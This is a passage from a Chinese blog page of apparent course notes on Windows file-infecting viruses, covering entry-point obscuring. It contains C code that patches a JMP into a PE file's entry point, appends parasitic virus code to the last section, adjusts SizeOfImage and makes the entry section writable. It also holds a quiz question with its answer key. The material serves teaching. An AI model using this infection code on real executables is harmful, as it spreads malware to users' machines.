lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize - (ntHdrs.OptionalHeader.AddressOfEntryPoint + <span class="number">5</span>);</span><br><span class="line">fseek(fp, entryDiskOffset, SEEK_SET); <span class="comment">//定位到入口点的文件位置</span></span><br><span class="line">fwrite(jmpCode, <span class="number">5</span>, <span class="number">1</span>, fp);	<span class="comment">//写入这条JMP指令</span></span><br><span class="line"><span class="comment">//传递4个参数给getCode函数，生成病毒寄生代码</span></span><br><span class="line"><span class="type">char</span>* code = getCode(ntHdrs.OptionalHeader.AddressOfEntryPoint, </span><br><span class="line">                       lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize,</span><br><span class="line">                       ntHdrs.OptionalHeader.ImageBase, firstCode);</span><br><span class="line"><span class="comment">//写入病毒寄生代码到文件中的最后一个节</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize, SEEK_SET);</span><br><span class="line">fwrite(code, codeSize, <span class="number">1</span>, fp);    </span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//修改ImageSize</span></span><br><span class="line">locateNTHdrStart(fp);</span><br><span class="line"><span class="type">int</span> offsetImageSize = (<span class="type">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);</span><br><span class="line"><span class="type">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + codeSize);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;</span><br><span class="line"><span class="type">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;<span class="comment">//取上整</span></span><br><span class="line"></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><ol>
+<li>关于寄生在Windows文件中的病毒数据区，下列说法不正确的是（       ）<br>A. 尽管PE文件本身提供了重定位机制，但访问病毒数据区还是需要自定位<br>B. 病毒数据区在寄生前，往往需要感染时借助病毒main函数传递的参数来进行数据填写<br>C. 病毒数据区的预期加载地址需要借助PE文件的相关字段信息计算出来<br>D. 病毒数据区的预期加载地址也可以通过内嵌汇编标号的方式获得</li>
+</ol>
+<p>参考答案：D</p>
+<p>解析：病毒数据区的预期加载地址只能算出来，不能通过内嵌汇编标号的方式获得</p>
+<h3 id="为入口点所在节增加内存可写属性"><a href="#为入口点所在节增加内存可写属性" class="headerlink" title="为入口点所在节增加内存可写属性"></a>为入口点所在节增加内存可写属性</h3><ol>
+<li>循环搜索入口点所在的节</li>
+<li>找到后保存该节的索引和属性字段</li>
+<li>然后在文件中定位到该节的节头，计算新的属性值并写入到节头的属性字段</li>
+</ol>
+<p>代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> entrySectionIndex;  <span class="comment">//变量 - 存入口点所在节的索引</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> characteristic;   <span class="comment">//变量 - 存入口点所在节的属性</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="comment">//找到入口点所在的节</span></span><br><span class="line">    <span class="keyword">if</span> ((entry &gt;= curHdr.VirtualAddress) &amp;&amp; </span><br><span class="line">         (entry &lt;= curHdr.VirtualAddress + curHdr.Misc.VirtualSize))</span><br><span class="line">    &#123;</span><br><span class="line">        entryOffsetToSectionStart = entry - curHdr.VirtualAddress;</span><br><span class="line">        entryDiskOffset = curHdr.PointerToRawData + entryOffsetToSectionStart;</span><br><span class="line">        entrySectionIndex = i; <span class="comment">//记录入口点所在节的索引值</span></span><br><span class="line">        characteristic = curHdr.Characteristics;  <span class="comment">//保存入口点所在节的原属性值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改入口点所在代码节的属性，添加可写属性80000000h</span></span><br><span class="line"><span class="comment">//先在文件中定位到节表的位置，节表在NT头的后面</span></span><br><span class="line">locateNTHdrStart(fp);   <span class="comment">//在文件中定位到NT头的位置</span></span><br><span class="line">fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);  <span class="comment">//移动NT头长度，定位节表</span></span><br><span class="line"><span class="comment">//所在节的节头位置为：该节索引*每个节头长度</span></span><br><span class="line"><span class="comment">//获得属性字段离该节节头的偏移</span></span><br><span class="line"><span class="type">int</span> offsetCha = (<span class="type">int</span>)&amp;(((IMAGE_SECTION_HEADER *)<span class="number">0</span>)-&gt;Characteristics);</span><br><span class="line"><span class="comment">//定位属性字段的文件位置：节头位置+属性字段离节头的偏移</span></span><br><span class="line">fseek(fp, (entrySectionIndex * <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER)) + offsetCha, SEEK_CUR);</span><br><span class="line"><span class="comment">//计算新的属性值</span></span><br><span class="line">characteristic = characteristic | <span class="number">0x80000000</span>;</span><br><span class="line"><span class="comment">//文件中写入新的属性值</span></span><br><span class="line">fwrite(&amp;characteristic, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%AF%BE%E7%A8%8B/" rel="tag"># 课程</a>
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" rel="tag"># 计算机</a>
+              <a href="/tags/%E7%97%85%E6%AF%92/" rel="tag"># 病毒</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/19/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/" rel="prev" title="病毒_Win_末节寄生程序设计">
+      <i class="fa fa-chevron-left"></i> 病毒_Win_末节寄生程序设计
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/19/%E7%97%85%E6%AF%92-Win-DLL-%E5%AF%BC%E5%87%BA%E8%A1%A8/" rel="next" title="病毒_Win_DLL+导出表">
+      病毒_Win_DLL+导出表 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E5%8F%A3%E7%82%B9%E6%A8%A1%E7%B3%8A%E6%8A%80%E6%9C%AF"><span class="nav-number">1.</span> <span class="nav-text">入口点模糊技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E5%85%A5%E5%8F%A3%E7%82%B9%E4%B8%8D%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%AE%B5%E9%97%AE%E9%A2%98"><span class="nav-number">1.1.</span> <span class="nav-text">解决入口点不在代码段问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EPO1-%E6%84%9F%E6%9F%93%E5%9C%A8%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E7%A9%BA%E6%B4%9E"><span class="nav-number">1.2.</span> <span class="nav-text">EPO1 感染在代码节的空洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.2.1.</span> <span class="nav-text">程序设计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%92%8C%E4%B9%8B%E5%89%8D%E7%9A%84%E4%B8%8D%E5%90%8C"><span class="nav-number">1.2.2.</span> <span class="nav-text">和之前的不同</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%BE%E4%BB%A3%E7%A0%81%E8%8A%82%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.2.3.</span> <span class="nav-text">找代码节的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">1.2.4.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EPO2-%E6%84%9F%E6%9F%93%E6%9C%80%E5%90%8E%E8%8A%82%EF%BC%8C%E6%9B%BF%E6%8D%A2%E5%85%A5%E5%8F%A3%E6%8C%87%E4%BB%A4"><span class="nav-number">1.3.</span> <span class="nav-text">EPO2 感染最后节，替换入口指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.3.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%A4%BA"><span class="nav-number">1.3.2.</span> <span class="nav-text">图示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getCode%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.3.3.</span> <span class="nav-text">getCode函数设计</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%84%9F%E6%9F%93%E4%BB%A3%E7%A0%81%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.4.</span> <span class="nav-text">感染代码设计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%A4%BA-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">图示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">代码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.5.</span> <span class="nav-text">例题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E5%85%A5%E5%8F%A3%E7%82%B9%E6%89%80%E5%9C%A8%E8%8A%82%E5%A2%9E%E5%8A%A0%E5%86%85%E5%AD%98%E5%8F%AF%E5%86%99%E5%B1%9E%E6%80%A7"><span class="nav-number">1.6.</span> <span class="nav-text">为入口点所在节增加内存可写属性</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">汪道之</p>
+  <div class="site-description" itemprop="description">有的人身着布衣，却心有锦缎。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">汪道之</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
